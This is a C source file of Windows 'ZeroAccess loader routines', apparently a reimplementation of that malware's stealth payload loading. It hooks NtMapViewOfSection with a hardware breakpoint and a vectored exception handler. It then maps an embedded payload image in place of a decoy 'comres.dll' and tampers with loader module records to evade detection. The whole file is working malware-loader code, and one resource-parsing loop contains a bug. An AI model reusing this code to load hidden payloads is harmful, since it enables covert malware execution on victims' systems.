/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016
*
*  TITLE:       LDR.C
*
*  VERSION:     1.00
*
*  DATE:        15 Jan 2016
*
*  ZeroAccess loader routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "_" };
PVOID g_pNtMapViewOfSection = NULL;

typedef struct _ZA_THREAD_CTX {
	TEB_ACTIVE_FRAME Frame;
	IMAGE_NT_HEADERS *fHeader;
	ULONG_PTR ReturnAddress; 
	ULONG_PTR PayloadImageBase;
	ULONG_PTR ViewBase;
} ZA_THREAD_CTX, *PZA_THREAD_CTX;

/*
* SfLdrQueryResourceDataEx
*
* Purpose:
*
* Manually parse resource directory and load resource by given id.
*
*/
PBYTE SfLdrQueryResourceDataEx(
	_In_ PVOID ImageBase,
	_In_ CONST LDR_RESOURCE_INFO* ResourceIdPath,
	_Out_ ULONG *DataSize
	)
{
	BOOL                             cond = FALSE, bFound = FALSE;
	IMAGE_RESOURCE_DIRECTORY        *ResRoot, *ResDir;
	IMAGE_RESOURCE_DIRECTORY_ENTRY  *ResourceEntry = NULL;
	IMAGE_RESOURCE_DATA_ENTRY       *ResData;
	WORD                             NumberOfIdEntries;
	ULONG                            Size;
	PBYTE                            Data;
	IMAGE_NT_HEADERS                *NtHeaders;

	if (DataSize) {
		*DataSize = 0;
	}

	Data = NULL;

	do {

		ResRoot = (PIMAGE_RESOURCE_DIRECTORY)RtlImageDirectoryEntryToData(ImageBase, FALSE, IMAGE_DIRECTORY_ENTRY_RESOURCE, &Size);
		if (ResRoot == NULL)
			break;

		NumberOfIdEntries = ResRoot->NumberOfIdEntries;
		if (NumberOfIdEntries == 0)
			break;

		bFound = FALSE;
		do {
			ResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PCHAR)ResRoot + sizeof(IMAGE_RESOURCE_DIRECTORY));
			if (ResourceEntry->Id == ResourceIdPath->Type) {
				bFound = TRUE;
				break;
			}
			ResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PCHAR)ResourceEntry + sizeof(IMAGE_RESOURCE_DIRECTORY));
			NumberOfIdEntries--;

		} while (NumberOfIdEntries != 0);

		if (bFound == FALSE)
			break;

		if ((ULONG_PTR)ResourceEntry > ((ULONG_PTR)ResRoot + Size))
			break;

		if (ResourceEntry->OffsetToData & 0x80000000) {
			ResDir = (PIMAGE_RESOURCE_DIRECTORY)((PUCHAR)ResRoot + (ResourceEntry->OffsetToData & 0x7FFFFFFF));
			if ((ULONG_PTR)ResDir > ((ULONG_PTR)ResRoot + Size))
				break;

			NumberOfIdEntries = ResDir->NumberOfIdEntries;
			if (NumberOfIdEntries == 0)
				break;

			ResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PUCHAR)ResDir + sizeof(IMAGE_RESOURCE_DIRECTORY));
			if ((ULONG_PTR)ResourceEntry > ((ULONG_PTR)ResRoot + Size))
				break;

			bFound = FALSE;

			do {

				if (ResourceEntry->Name == ResourceIdPath->Name) {
					bFound = TRUE;
					break;
				}

				ResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PCHAR)ResourceEntry + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
				NumberOfIdEntries--;

			} while (NumberOfIdEntries != 0);

			if (bFound == FALSE)
				break;

			if (ResourceEntry->OffsetToData & 0x80000000) {
				ResDir = (PIMAGE_RESOURCE_DIRECTORY)((PUCHAR)ResRoot + (ResourceEntry->OffsetToData & 0x7FFFFFFF));
				if (ResDir->NumberOfIdEntries == 0)
					break;
				ResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PUCHAR)ResDir + sizeof(IMAGE_RESOURCE_DIRECTORY));
			}

			if ((ULONG_PTR)ResourceEntry > ((ULONG_PTR)ResRoot + Size))
				break;

			if (ResourceEntry) {
				ResData = (PIMAGE_RESOURCE_DATA_ENTRY)((PUCHAR)ResRoot + ResourceEntry->OffsetToData);

				NtHeaders = RtlImageNtHeader(ImageBase);
				Data = RtlAddressInSectionTable(NtHeaders, ImageBase, ResData->OffsetToData);
				if (DataSize) {
					*DataSize = ResData->Size;
				}
			}
		}
	} while (cond);

	return Data;
}

/*
* SfLdrQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE SfLdrQueryResourceData(
	_In_ ULONG_PTR ResourceId,
	_In_ PVOID DllHandle,
	_In_ PULONG DataSize
	)
{
	NTSTATUS                   status;
	ULONG_PTR                  IdPath[3];
	IMAGE_RESOURCE_DATA_ENTRY  *DataEntry;
	PBYTE                      Data = NULL;
	ULONG                      SizeOfData = 0;

	if (DllHandle != NULL) {

		IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
		IdPath[1] = ResourceId;           //id
		IdPath[2] = 0;                    //lang

		status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
		if (NT_SUCCESS(status)) {
			status = LdrAccessResource(DllHandle, DataEntry, &Data, &SizeOfData);
			if (NT_SUCCESS(status)) {
				if (DataSize) {
					*DataSize = SizeOfData;
				}
			}
		}
	}
	return Data;
}

//mechanism 8


VOID NTAPI SfLdrEnumModules(
	_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
	_In_ PVOID Context,
	_In_ OUT BOOLEAN *StopEnumeration
	)
{
	PUNICODE_STRING uDllName = (PUNICODE_STRING)Context;

	if (uDllName) {
		if (RtlEqualUnicodeString(&DataTableEntry->BaseDllName, uDllName, TRUE)) {
			DataTableEntry->BaseDllName.Length |= 1;
			DataTableEntry->BaseDllName.Buffer[1]++;
		}
	}
	else {

		if (DataTableEntry->BaseDllName.Length & 1) {
			DataTableEntry->BaseDllName.Length &= ~1;
			DataTableEntry->BaseDllName.Buffer[1]--;
		}
	}
	*StopEnumeration = 0;
}

LONG NTAPI SfLdrVehHandler(
	EXCEPTION_POINTERS *ExceptionInfo
	)
{
	LPWSTR                DllString;
	PZA_THREAD_CTX        ZACtx = NULL;
	SIZE_T                *ViewSize;

	if (
		(ExceptionInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP) ||
		(ExceptionInfo->ExceptionRecord->ExceptionAddress != g_pNtMapViewOfSection)
		)
	{
		return EXCEPTION_CONTINUE_SEARCH;
	}

	DllString = _filename_w((LPWSTR)NtCurrentTeb()->NtTib.ArbitraryUserPointer);
	if (_strcmpi_w(DllString, L"comres.dll") == 0) {

		ZACtx = (PZA_THREAD_CTX)RtlGetFrame();
		while ((ZACtx != NULL) && (ZACtx->Frame.Context != &g_fctx)) {
			ZACtx = (PZA_THREAD_CTX)ZACtx->Frame.Previous;
		}

		if (ZACtx) {

#ifdef _WIN64
			ZACtx->ReturnAddress = *(ULONG_PTR *)ExceptionInfo->ContextRecord->Rsp;
			ZACtx->ViewBase = (ULONG_PTR)ExceptionInfo->ContextRecord->R8;

			ViewSize = (PSIZE_T)*(PSIZE_T)(ExceptionInfo->ContextRecord->Rsp + 0x38);
			*ViewSize = ZACtx->fHeader->OptionalHeader.SizeOfImage;

			//*(ULONG_PTR *)ExceptionInfo->ContextRecord->Rsp = (ULONG_PTR)&SfpLdrPostCallHandler;
#else
			ZACtx->ReturnAddress = *(ULONG_PTR *)ExceptionInfo->ContextRecord->Esp;
			ZACtx->ViewBase = *(PULONG_PTR)(ExceptionInfo->ContextRecord->Esp + 0xc);

			ViewSize = (PSIZE_T)*(PSIZE_T)(ExceptionInfo->ContextRecord->Esp + 0x1c);
			*ViewSize = ZACtx->fHeader->OptionalHeader.SizeOfImage;

			//*(ULONG_PTR *)ExceptionInfo->ContextRecord->Esp = (ULONG_PTR)&SfpLdrPostCallHandler;
#endif
		}
	}

	if (
		(USER_SHARED_DATA->NtMajorVersion < 6) &&
		(USER_SHARED_DATA->NtMinorVersion < 2)
		)
	{
		ExceptionInfo->ContextRecord->Dr3 = 0;
	}
	ExceptionInfo->ContextRecord->EFlags |= 0x10000;
	return EXCEPTION_CONTINUE_EXECUTION;
}

VOID SfLdrLoadPayload(
	PVOID PayloadImageBase
	)
{
	CONTEXT                  ctx;
	NTSTATUS                 status;
	PVOID                    ExceptionHandler, DllImageBase = NULL;
	DWORD_PTR                ArbitraryUserPointer = 0;
	UNICODE_STRING           DllName;
#ifdef _DEBUG
	ANSI_STRING              str;
#endif
	ZA_THREAD_CTX            zactx;

	RtlSecureZeroMemory(&zactx, sizeof(zactx));
	zactx.Frame.Context = &g_fctx;
	zactx.Frame.Flags = 0;
	zactx.PayloadImageBase = (ULONG_PTR)PayloadImageBase;

	RtlPushFrame((PTEB_ACTIVE_FRAME)&zactx);

	zactx.fHeader = RtlImageNtHeader(PayloadImageBase);
	if (zactx.fHeader) {
		ExceptionHandler = RtlAddVectoredExceptionHandler(1, &SfLdrVehHandler);
		if (ExceptionHandler) {

#ifdef _DEBUG
			RtlSecureZeroMemory(&DllName, sizeof(DllName));
			RtlInitUnicodeString(&DllName, L"ntdll.dll");
			if (NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase))) {
				RtlInitString(&str, "NtMapViewOfSection");
				LdrGetProcedureAddress(DllImageBase, &str, 0, &g_pNtMapViewOfSection);
			}
#else
			g_pNtMapViewOfSection = NtMapViewOfSection;
#endif

			RtlSecureZeroMemory(&ctx, sizeof(CONTEXT));
			ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
			ctx.Dr3 = (DWORD_PTR)g_pNtMapViewOfSection;
			ctx.Dr7 = 0x440;

			if (NT_SUCCESS(NtSetContextThread(NtCurrentThread(), &ctx))) {

				RtlInitUnicodeString(&DllName, L"comres.dll");

				LdrEnumerateLoadedModules(0, &SfLdrEnumModules, (PVOID)&DllName);

//save and zero NtTib.ArbitraryUserPointer
#ifdef _WIN64
				ArbitraryUserPointer = (DWORD_PTR)__readgsqword(0x28);
				__writegsqword(0x28, 0);
#else
				ArbitraryUserPointer = (DWORD_PTR)__readfsdword(0x14);
				__writefsdword(0x14, 0);
#endif
				status = LdrLoadDll(NULL, NULL, &DllName, &DllImageBase);

//restore NtTib.ArbitraryUserPointer
#ifdef _WIN64
				__writegsqword(0x28, ArbitraryUserPointer);
#else
				__writefsdword(0x14, ArbitraryUserPointer);
#endif
				LdrEnumerateLoadedModules(0, &SfLdrEnumModules, NULL);

				ctx.Dr3 = 0;
				ctx.Dr7 = 0x400;
				NtSetContextThread(NtCurrentThread(), &ctx);
			}
			RtlRemoveVectoredExceptionHandler(ExceptionHandler);
		}
	}
	RtlPopFrame((PTEB_ACTIVE_FRAME)&zactx);
}
